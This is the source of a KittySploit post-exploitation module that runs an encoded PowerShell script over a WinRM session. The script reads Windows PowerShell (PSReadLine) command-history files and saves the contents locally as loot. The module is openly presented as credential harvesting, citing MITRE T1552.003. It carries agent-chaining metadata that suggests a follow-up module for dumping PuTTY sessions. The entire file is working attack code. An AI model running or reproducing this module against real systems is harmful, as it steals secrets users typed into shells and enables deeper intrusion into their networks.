#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin
import re


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Gather PowerShell History",
		"description": "Read PSReadLine ConsoleHost_history.txt files through a WinRM session",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1552.003/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["command_history"],
				"suggested_followups": ["post/winrm/gather/dump_putty_sessions"],
			},
		},
	}

	save_local = OptBool(True, "Save history under ./output", False)
	max_lines = OptInteger(500, "Maximum lines to return per history file", False)

	def _script(self, limit: int) -> str:
		return f"""
$ErrorActionPreference = 'Stop'
$limit = {int(limit)}
$candidates = @(
  (Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'),
  (Join-Path $env:APPDATA 'Microsoft\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'),
  (Join-Path $env:LOCALAPPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
) | Select-Object -Unique
$sections = New-Object System.Collections.Generic.List[string]
foreach ($path in $candidates) {{
  if (-not (Test-Path -LiteralPath $path)) {{ continue }}
  $lines = Get-Content -LiteralPath $path -ErrorAction Stop
  if ($lines.Count -gt $limit) {{
    $lines = $lines | Select-Object -Last $limit
    $header = "=== $path (last $limit lines) ==="
  }} else {{
    $header = "=== $path ($($lines.Count) lines) ==="
  }}
  $sections.Add("$header`n$($lines -join "`n")")
}}
if ($sections.Count -eq 0) {{ Write-Output 'No PowerShell history files found.' }}
else {{ $sections -join "`n`n" }}
"""

	def run(self):
		try:
			try:
				limit = max(1, int(self.max_lines))
			except Exception:
				limit = 500
			print_status("Reading PowerShell history over WinRM...")
			result = self.winrm_run_encoded_ps(self._script(limit))
			if not result:
				raise ProcedureError(FailureType.Unknown, "No output returned")
			if re.search(r"No PowerShell history files found", result, re.I):
				print_warning(result)
				return True
			if self._bool_opt(self.save_local, True):
				path = self.winrm_save_loot(result, "winrm_powershell_history")
				print_success(f"Saved to ./{path}")
			print_success("PowerShell history extraction completed")
			print_info(result)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM PS history error: {exc}")
